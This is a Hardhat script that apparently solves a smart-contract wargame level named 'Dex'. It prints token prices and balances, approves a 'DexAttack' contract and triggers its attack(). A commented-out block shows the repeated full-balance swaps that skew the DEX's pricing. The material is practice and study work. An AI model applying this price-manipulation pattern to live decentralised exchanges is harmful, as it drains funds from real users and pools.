import { ethers } from "hardhat";
import { attack } from "../typechain-types/contracts";

const CONTRACT_ADDRESS = "0x449264284B572Ac8e066cD695b2ec4E9018dE1fE"
const PLAYER_ADDRESS = "0xBcd4042DE499D14e55001CcbB24a551F3b954096"
const ATTACK_ADDRESS = "0x9757606eFB5c21D76e0C55cdc61B99c1f42f502C"

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS)
  const contract = await ethers.getContractAt("Dex", CONTRACT_ADDRESS, signer)
  const attackContract = await ethers.getContractAt("DexAttack", ATTACK_ADDRESS, signer)

  const token1 = await contract.token1()
  const token2 = await contract.token2()

  console.log("amount of token2 for 100 token1: ", await contract.getSwapPrice(token1, token2, 100))
  console.log("amount of token1 for 100 token2: ", await contract.getSwapPrice(token2, token1, 100))
  console.log("player token1 balance: ", await contract.balanceOf(token1, PLAYER_ADDRESS))
  console.log("player token2 balance: ", await contract.balanceOf(token2, PLAYER_ADDRESS))
  console.log("contract token1 balance: ", await contract.balanceOf(token1, CONTRACT_ADDRESS))
  console.log("contract token2 balance: ", await contract.balanceOf(token2, CONTRACT_ADDRESS))

  /*await contract.approve(CONTRACT_ADDRESS, await contract.balanceOf(token1, PLAYER_ADDRESS) || await contract.balanceOf(token2, PLAYER_ADDRESS))
  if (await contract.balanceOf(token1, PLAYER_ADDRESS)) {
    console.log("buy token2")
    await contract.swap(token1, token2, await contract.balanceOf(token1, PLAYER_ADDRESS))
  } else {
    console.log("buy token1")
    await contract.swap(token2, token1, await contract.balanceOf(token2, PLAYER_ADDRESS))
  }*/

  await contract.approve(attackContract, 1000000)
  await attackContract.attack()

  console.log("amount of token2 for 100 token1: ", await contract.getSwapPrice(token1, token2, 100))
  console.log("amount of token1 for 100 token2: ", await contract.getSwapPrice(token2, token1, 100))
  console.log("player token1 balance: ", await contract.balanceOf(token1, PLAYER_ADDRESS))
  console.log("player token2 balance: ", await contract.balanceOf(token2, PLAYER_ADDRESS))
  console.log("contract token1 balance: ", await contract.balanceOf(token1, CONTRACT_ADDRESS))
  console.log("contract token2 balance: ", await contract.balanceOf(token2, CONTRACT_ADDRESS))
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
